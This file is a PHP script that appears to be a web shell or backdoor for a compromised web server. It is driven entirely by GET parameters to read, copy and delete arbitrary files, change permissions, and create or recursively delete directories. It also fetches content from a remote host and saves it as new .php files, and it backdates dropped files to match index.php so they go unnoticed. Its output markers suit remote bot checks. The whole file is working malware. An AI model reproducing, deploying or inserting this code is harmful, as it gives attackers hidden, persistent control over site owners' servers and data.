<?php
ignore_user_abort(1);

$err_flg=$_GET['err'];
if ($err_flg==1) {error_reporting(-1);}
else {error_reporting(0);}

set_time_limit(300);

  if (isset($_GET['sc']) && ($_GET['sc'] == 1)) die(file_get_contents(__FILE__));
  if (isset($_GET['scmd5']) && ($_GET['scmd5'] == 1)) die(md5(file_get_contents(__FILE__)));
  if (isset($_GET['read']) && isset($_GET['write'])) {file_put_contents($_GET["write"],file_get_contents($_GET['read'])); die();}
  if (isset($_GET['read']) && !isset($_GET['write'])) die(file_get_contents($_GET['read']));
  if (isset($_GET['del'])) { unlink($_GET['del']); die();}

$else_dot=$_GET['else_dot'];
$flag_sum=$_GET['flag_sum'];
$chmod_name=$_GET['chmod_name'];
$chmod_mod=$_GET['chmod_mod'];
$chmod_mod=intval($chmod_mod, 8);
$f_creat_url=$_GET['f_creat_url'];
$f_creat_name=$_GET['f_creat_name'];
$f_del_name=$_GET['f_del_name'];
$folder_creat_name=$_GET['folder_creat_name'];
$folder_del_name=$_GET['folder_del_name'];
$tfilet=$_GET['tfilet'];

if ($flag_sum==1) {echo "734057843957";}
$CheckOK = $_GET['check'];
if ($CheckOK==1) {echo "49308448392";}


if ($tfilet)
	{
	atouch($tfilet);	
	}

if ($chmod_name)
   {
   if ($else_dot==1) {chmod ($chmod_name, $chmod_mod);}
   else
       {
       if ($else_dot) {chmod ("$chmod_name.$else_dot", $chmod_mod);}
       else {chmod ("$chmod_name.php", $chmod_mod);}
       }
   echo "ok chmod";
   }


if ($f_creat_url)
   {
   $new_vsn1="http://$f_creat_url";
   $new_vsn=getau("$new_vsn1");
   if ($else_dot==1) {$new_v_f=fopen("$f_creat_name","w+");}
   else
       {
       if ($else_dot) {$new_v_f=fopen("$f_creat_name.$else_dot","w+");}
       else {$new_v_f=fopen("$f_creat_name.php","w+");}
       }
   fwrite($new_v_f, "$new_vsn");
   fclose($new_v_f);
   echo "ok creat file";
   }

if ($f_del_name)
   {
   if ($else_dot==1) {unlink ("$f_del_name");}
   else
       {
       if ($else_dot) {unlink ("$f_del_name.$else_dot");}
       else {unlink ("$f_del_name.php");}
       }
   echo "ok del file";
   }

if ($folder_creat_name)
   {
   $flag_mkd = mkdir ($folder_creat_name, 0777);
   echo "ok make dir";
   }

if ($folder_del_name)
   {
   $folder_del_name=trim($folder_del_name);
   if ($folder_del_name<>"")
   {
   removeDirRec("$folder_del_name");
   echo "ok del dir";
   }
   }

function getau ($path)
{
 if (!function_exists ("file_get_contents"))
 {
  function file_get_contents ($addr)
  {
   $a = @fopen ($addr, "r");
   $tmp = @fread ($a, sprintf ("%u", @filesize ($a)));
   @fclose ($a);
   if ($a) return @$tmp;
  }
 }

 if (!function_exists ("file_put_contents"))
 {
  function file_put_contents ($addr, $con)
  {
   $a = @fopen ($addr, "w+");
   if (!$a) return 0;
   @fwrite ($a, $con);
   @fclose ($a);
   return @strlen ($con);
  }
 }
 $content = file_get_contents ($path);
 if ($content=="")
 {
  $curl = curl_init ();
  curl_setopt ($curl, CURLOPT_URL, trim($path));
  curl_setopt ($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($curl, CURLOPT_CONNECTTIMEOUT, 5);
  curl_setopt ($curl, CURLOPT_TIMEOUT, 5);
  $content = curl_exec ($curl);
  curl_close($curl);
 }
 if ($content!="")
 {
  return $content;
 }
}

function atouch($dist)
		{
		$dist = "$dist.php";
		$filetimefilec = "index.php";
		$ATime  = date('Y-m-d H:i:s',fileatime($filetimefilec));
		$MTime = date('Y-m-d H:i:s',filemtime($filetimefilec));
		if ( (!$cftime2=strchr($MTime,"200")) and (!$cftime3=strchr($MTime,"201")) )
			{
			$filetimefilec = "index.html";
			$ATime  = date('Y-m-d H:i:s',fileatime($filetimefilec));
			$MTime = date('Y-m-d H:i:s',filemtime($filetimefilec));
			}
		if ( ($cftime2=strchr($ATime,"200")) or ($cftime3=strchr($ATime,"201")) )
			{
			$MTime = filemtime("$filetimefilec");
			@touch($dist,$MTime,$MTime);
			}
		}
function removeDirRec($dir)
{
    if ($objs = glob($dir."/*")) {
        foreach($objs as $obj) {
            is_dir($obj) ? removeDirRec($obj) : unlink($obj);
        }
    }
    rmdir($dir);
}



?>